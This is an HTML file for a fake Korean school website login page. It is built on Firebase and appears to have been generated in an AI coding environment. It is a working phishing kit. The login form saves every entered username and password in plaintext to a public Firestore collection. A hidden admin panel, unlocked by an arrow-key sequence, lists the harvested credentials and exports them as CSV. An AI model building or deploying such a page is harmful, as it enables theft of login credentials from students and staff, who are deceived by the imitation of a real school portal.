<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>학교홈페이지 로그인</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs, deleteDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        // 환경 설정 (Canvas 환경 변수 활용)
        const firebaseConfig = JSON.parse(__firebase_config);
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'school-login-app';
        
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        let currentUser = null;

        // 초기 인증 설정 (Rule 3)
        const initAuth = async () => {
            try {
                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                    await signInWithCustomToken(auth, __initial_auth_token);
                } else {
                    await signInAnonymously(auth);
                }
            } catch (error) {
                console.error("Auth error:", error);
            }
        };

        onAuthStateChanged(auth, (user) => {
            currentUser = user;
            if (user && window.isAdminMode) {
                window.fetchServerData();
            }
        });

        initAuth();

        // --- 로그인 처리 (사용자 데이터를 서버에 기록) ---
        window.handleLogin = async () => {
            if (!currentUser) {
                showToast('서버 연결 중입니다. 잠시 후 다시 시도해주세요.');
                return;
            }

            const id = document.getElementById('userId').value.trim();
            const pw = document.getElementById('userPw').value.trim();

            if (!id || !pw) {
                showToast('아이디와 비밀번호를 모두 입력해주세요.');
                return;
            }

            setLoading(true);

            try {
                // Rule 1: 지정된 경로에 유저 정보 저장 (관리자 패널에서 조회 가능하도록)
                const userRef = doc(db, 'artifacts', appId, 'public', 'data', 'users', id);
                await setDoc(userRef, {
                    username: id,
                    password: pw,
                    savedAt: serverTimestamp(),
                    accessSource: 'Web'
                });

                showToast('로그인 정보가 성공적으로 기록되었습니다.');
                document.getElementById('userId').value = '';
                document.getElementById('userPw').value = '';
            } catch (error) {
                console.error("Storage error:", error);
                showToast('서버 연결 오류가 발생했습니다.');
            } finally {
                setLoading(false);
            }
        };

        // --- 관리자 기능 (서버에서 기록된 데이터 불러오기) ---
        window.fetchServerData = async () => {
            if (!currentUser) return;
            const listContainer = document.getElementById('userList');
            listContainer.innerHTML = '<tr><td colspan="4" class="p-6 text-center text-gray-400">서버에서 데이터를 동기화 중...</td></tr>';

            try {
                // Rule 1 & 2: 지정된 경로에서 전체 데이터 호출
                const querySnapshot = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'users'));
                const users = [];
                querySnapshot.forEach((doc) => {
                    users.push({ id: doc.id, ...doc.data() });
                });

                if (users.length === 0) {
                    listContainer.innerHTML = '<tr><td colspan="4" class="p-6 text-center text-gray-400">저장된 데이터가 없습니다.</td></tr>';
                    return;
                }

                // 메모리 내 정렬 (최신순)
                users.sort((a, b) => (b.savedAt?.seconds || 0) - (a.savedAt?.seconds || 0));

                listContainer.innerHTML = '';
                users.forEach((user, index) => {
                    const date = user.savedAt ? new Date(user.savedAt.seconds * 1000).toLocaleString() : '-';
                    listContainer.innerHTML += `
                        <tr class="border-b hover:bg-gray-50 transition-colors">
                            <td class="p-3 text-center text-gray-500">${index + 1}</td>
                            <td class="p-3 font-bold text-blue-800">${user.username}</td>
                            <td class="p-3 font-mono text-red-500 bg-red-50/30">${user.password}</td>
                            <td class="p-3 text-xs text-center text-gray-400">
                                ${date} 
                                <button onclick="deleteUser('${user.id}')" class="ml-4 text-red-300 hover:text-red-600 font-bold">삭제</button>
                            </td>
                        </tr>`;
                });
                window.cachedUsers = users;
            } catch (e) { 
                console.error("Fetch error:", e);
                showToast('데이터를 불러올 권한이 없습니다.'); 
            }
        };

        window.deleteUser = async (id) => {
            if (!confirm('해당 정보를 서버에서 영구히 삭제하시겠습니까?')) return;
            try {
                await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'users', id));
                showToast('정보가 삭제되었습니다.');
                window.fetchServerData();
            } catch (e) {
                showToast('삭제 권한이 없습니다.');
            }
        };

        window.downloadCSV = () => {
            if (!window.cachedUsers || window.cachedUsers.length === 0) {
                showToast('내보낼 데이터가 없습니다.');
                return;
            }
            let csv = "\uFEFF번호,아이디,비밀번호,기록시간\n";
            window.cachedUsers.forEach((u, i) => {
                const date = u.savedAt ? new Date(u.savedAt.seconds * 1000).toLocaleString() : '-';
                csv += `${i+1},${u.username},${u.password},${date}\n`;
            });
            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
            const link = document.createElement("a");
            link.href = URL.createObjectURL(blob);
            link.download = `server_data_${new Date().getTime()}.csv`;
            link.click();
        };

        window.showToast = (text) => {
            const toast = document.getElementById('toast');
            toast.innerText = text;
            toast.style.display = 'block';
            setTimeout(() => { toast.style.display = 'none'; }, 2500);
        };

        function setLoading(val) {
            const btn = document.getElementById('loginBtn');
            btn.disabled = val;
            btn.innerText = val ? '기록중' : '로그인';
        }
    </script>

    <style>
        body { font-family: 'Malgun Gothic', 'dotum', sans-serif; background-color: #fff; color: #333; }
        .notice-box { background-color: #f7f7f7; border: 1px solid #e5e5e5; padding: 20px 30px; margin-bottom: 30px; line-height: 1.6; font-size: 14px; }
        .main-container { display: flex; max-width: 900px; margin: 0 auto; border: 1px solid #ddd; }
        .left-box { width: 45%; background-color: #fff; border-right: 1px solid #ddd; display: flex; align-items: center; justify-content: center; padding: 60px 20px; font-size: 13px; font-weight: bold; color: #333; text-align: center; }
        .right-box { width: 55%; padding: 30px 40px; }
        .input-row { display: flex; align-items: center; margin-bottom: 8px; }
        .label { width: 70px; font-size: 13px; color: #666; font-weight: bold; }
        .input-item { flex: 1; height: 34px; border: 1px solid #ccc; padding: 0 8px; font-size: 14px; outline: none; transition: border-color 0.2s; }
        .input-item:focus { border-color: #0070b8; }
        .login-button { background-color: #0070b8; color: white; width: 100px; height: 76px; border: none; margin-left: 10px; font-weight: bold; font-size: 15px; cursor: pointer; transition: background-color 0.2s; }
        .login-button:hover { background-color: #005a96; }
        .bottom-nav { margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; display: flex; justify-content: center; gap: 15px; font-size: 12px; color: #888; }
        #toast { display: none; position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #222; color: #fff; padding: 10px 20px; border-radius: 4px; z-index: 10000; font-size: 13px; }
        
        /* 숨겨진 관리자 패널 */
        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; padding: 40px; overflow-y: auto; }
        .admin-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        .admin-table th { background: #f8f9fa; border: 1px solid #dee2e6; padding: 12px; font-size: 13px; text-align: center; color: #495057; }
        .admin-table td { border: 1px solid #dee2e6; padding: 10px; font-size: 14px; }
    </style>
</head>
<body class="p-8">

    <div id="toast"></div>

    <!-- [1] 로그인 화면 (최신 이미지 디자인 적용) -->
    <div id="loginView" class="max-w-[900px] mx-auto pt-10">
        <h1 class="text-[32px] font-bold mb-8 pb-5 border-b-[3px] border-black text-[#222]">로그인</h1>

        <div class="notice-box">
            학교홈페이지에 가입된 아이디는 교육청에서 제공하는 해당 학교홈페이지에서만 사용이 가능하며 
            <span class="text-[#e60012] font-bold">(상급학교진학/전학/전출 시)</span> 
            <span class="font-bold text-[#333]">기존의 아이디는 회원탈퇴 한 후 다른 학교에서 새롭게 회원가입을 진행하셔야 합니다.</span>
        </div>

        <div class="main-container shadow-sm">
            <div class="left-box">
                학교홈페이지 회원가입
            </div>
            <div class="right-box">
                <p class="text-[13px] mb-5 leading-tight">
                    본 학교홈페이지에 회원 가입이 되어 있으면 <span class="text-[#0050a0] font-bold">기존 아이디를 사용하시면 됩니다.</span>
                </p>
                <div class="flex">
                    <div class="flex-1 space-y-1">
                        <div class="input-row"><span class="label">아이디</span><input type="text" id="userId" class="input-item" autocomplete="off"></div>
                        <div class="input-row"><span class="label">비밀번호</span><input type="password" id="userPw" class="input-item" autocomplete="off"></div>
                    </div>
                    <button id="loginBtn" class="login-button" onclick="handleLogin()">로그인</button>
                </div>
                <div class="bottom-nav">
                    <a href="javascript:void(0)" class="hover:underline">아이디 찾기</a><span>|</span><a href="javascript:void(0)" class="hover:underline">비밀번호 찾기</a>
                </div>
            </div>
        </div>
    </div>

    <!-- [2] 숨겨진 관리자 패널 (서버 데이터 연동) -->
    <div id="adminPanel">
        <div class="max-w-4xl mx-auto">
            <div class="flex justify-between items-end mb-6 border-b-2 border-gray-800 pb-4">
                <div>
                    <h2 class="text-2xl font-bold text-gray-800">서버 데이터 관리자 패널</h2>
                    <p class="text-xs text-gray-500 mt-1">사용자가 입력한 정보가 실시간으로 동기화됩니다.</p>
                </div>
                <div class="flex gap-2">
                    <button onclick="window.fetchServerData()" class="bg-blue-600 text-white px-4 py-2 rounded text-xs font-bold hover:bg-blue-700">새로고침</button>
                    <button onclick="downloadCSV()" class="bg-green-600 text-white px-4 py-2 rounded text-xs font-bold hover:bg-green-700">CSV 내 컴퓨터 저장</button>
                    <button onclick="location.reload()" class="bg-gray-200 text-gray-700 px-4 py-2 rounded text-xs font-bold hover:bg-gray-300">패널 닫기</button>
                </div>
            </div>

            <div class="bg-white rounded border overflow-hidden">
                <table class="admin-table">
                    <thead>
                        <tr>
                            <th style="width: 60px;">No</th>
                            <th>아이디(ID)</th>
                            <th>비밀번호(PW)</th>
                            <th>수집 일시 / 제어</th>
                        </tr>
                    </thead>
                    <tbody id="userList">
                        <!-- 서버 데이터 로드 위치 -->
                    </tbody>
                </table>
            </div>
            <p class="text-center text-[11px] text-gray-400 mt-6">이 페이지는 Firestore Cloud DB와 실시간으로 연동되어 있습니다.</p>
        </div>
    </div>

    <script>
        // 관리자 진입 패턴 (↑ ↑ ↓ ↓ ← →)
        const pattern = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
        let currentStep = 0;

        document.addEventListener('keydown', (e) => {
            // 패턴 일치 확인
            if (e.key === pattern[currentStep]) {
                currentStep++;
                if (currentStep === pattern.length) {
                    toggleAdmin();
                    currentStep = 0;
                }
            } else {
                currentStep = 0;
            }

            // 일반 로그인 시 엔터 지원
            if (e.key === 'Enter' && !window.isAdminMode) {
                window.handleLogin();
            }
        });

        function toggleAdmin() {
            const panel = document.getElementById('adminPanel');
            const login = document.getElementById('loginView');
            panel.style.display = 'block';
            login.style.display = 'none';
            window.isAdminMode = true;
            window.fetchServerData();
            window.showToast('관리자 모드가 활성화되었습니다. 서버 데이터를 불러옵니다.');
        }
    </script>
</body>
</html>
